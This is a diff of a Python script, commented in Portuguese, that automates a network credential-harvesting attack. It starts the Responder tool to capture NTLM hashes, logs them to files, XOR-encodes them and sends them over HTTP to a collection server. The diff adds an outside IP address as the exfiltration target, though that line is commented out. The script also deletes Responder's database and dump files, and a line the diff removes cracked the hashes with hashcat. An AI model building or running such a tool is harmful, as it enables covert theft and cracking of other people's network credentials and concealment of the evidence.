@@ -4,6 +4,7 @@ from datetime import datetime
 import base64
 import requests
 import time
+import sys
 
 def xor_encrypt(base64_string, key):
     key_length = len(key)
@@ -13,8 +14,51 @@ def xor_encrypt(base64_string, key):
         encrypted_bytes.append(encrypted_byte)
     return bytes(encrypted_bytes)
 
+conteudo_arquivo = ""
+
+# Nome do arquivo a ser lido
+nome_arquivo = "/tmp/captured_mac.txt"
+
+# Lê o arquivo e armazena seu conteúdo em uma variável
+try:
+    with open(nome_arquivo, 'r') as f:
+        conteudo_arquivo = f.read()
+        if len(conteudo_arquivo) > 5:
+            print(f"[!] MAC Capturado: {conteudo_arquivo}")
+            print("[+] MAC Alterado! (macchanger)")
+        else:
+            print("[X] Nenhum MAC Encontrado...")
+            sys.exit(0)
+except FileNotFoundError:
+    print(f"[X] Erro: o arquivo '{nome_arquivo}' não foi encontrado.")
+    sys.exit(0)
+
+import time
+
+def get_eth0_ip():
+    while True:
+        try:
+            result = subprocess.run(['ip', 'addr', 'show', 'eth1'], capture_output=True, text=True)
+            output = result.stdout
+            lines = output.splitlines()
+            for line in lines:
+                if 'inet ' in line:  # Procura pela linha que contém 'inet '
+                    ip_address = line.split()[1]
+                    return ip_address
+            # Se nenhum endereço IP foi encontrado, espera por um curto período antes de tentar novamente
+            time.sleep(1)
+        except subprocess.CalledProcessError:
+            # Em caso de erro ao executar o comando, espera e tenta novamente
+            time.sleep(1)
+
+print("[+] Aguardando definir o ip...")
+
+ip = get_eth0_ip()
+print(f'[!] IPv4: {ip}')
+
 
 print("[+] Iniciando Responder")
+os.system("sudo service responder stop")
 os.system("sudo service responder start")
 i=0
 while True:
@@ -25,7 +69,8 @@ while True:
 
     # Verifica Quantidade de Hashes Coleta + Cria Arquivo .txt único de Backup
     nome_arquivo="hashes-"+datetime.now().strftime("%Y-%m-%d-%H-%M-%S")+".txt"
-    print("[+] Quantidade de Hashes coletada:",len(lista_filtrada),"| Tempo:",i,"s")
+    ip = get_eth0_ip()
+    print("[+]",len(lista_filtrada),"Hashes coletadas |",ip,"| Tempo:",i,"s")
     i+=10
     if len(lista_filtrada) >= 10:
         print("[+] Salvando hashes coletados no arquivo:",nome_arquivo)
@@ -43,7 +88,7 @@ while True:
         # Criptografar usando XOR
         encrypted_bytes = xor_encrypt(decoded_bytes, key)
 
-        requests.get("http://127.0.0.1:3030/"+str(encrypted_bytes))
+        #requests.get("http://69.55.55.7:3031/"+str(b))
         print("[+] Limpando database Responder")
         os.system("echo '' > DumpNTLMv2.txt && echo '' > DumpNTLMv1.txt")
         os.system("rm /usr/share/responder/Responder.db")
@@ -88,8 +133,6 @@ while True:
         print("[!] Hashcat finalizado:",e)'''
 
 
-    #os.system("hashcat -a 0 -m 5600  /usr/share/responder/"+nome_arquivo+" /usr/share/wordlists/rockyou.txt --outfile-format=2 --outfile=out.txt")
 
 
-
-
+		
